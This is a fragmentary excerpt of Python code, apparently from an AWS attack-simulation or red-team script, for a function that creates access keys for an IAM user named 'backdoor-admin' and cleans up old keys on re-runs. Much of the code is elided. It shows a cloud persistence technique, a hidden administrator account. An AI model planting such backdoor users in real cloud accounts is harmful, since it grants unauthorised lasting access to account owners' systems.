...
def create_backdoor_user(
    ...
    # Create access keys
    # Handle re-runs: if backdoor-admin already has keys from a previous run,
    # delete them first (AWS max is 2 keys per user)
    try:
        ...
        if exc.response["Error"]["Code"] == "LimitExceeded":
            print_warning("Key limit reached (previous run). Cleaning up old keys...")
            try:
                old_keys = iam.list_access_keys(UserName=username)
                for key_meta in old_keys.get("AccessKeyMetadata", []):
                ...
                print_success(
                    f"Access key created (after cleanup): "
                    f"{key_resp['AccessKey']['AccessKeyId'][:8]}..."
                )
            except botocore.exceptions.ClientError as exc2:
                print_error(f"Failed to create access key after cleanup: {exc2}")
        else:
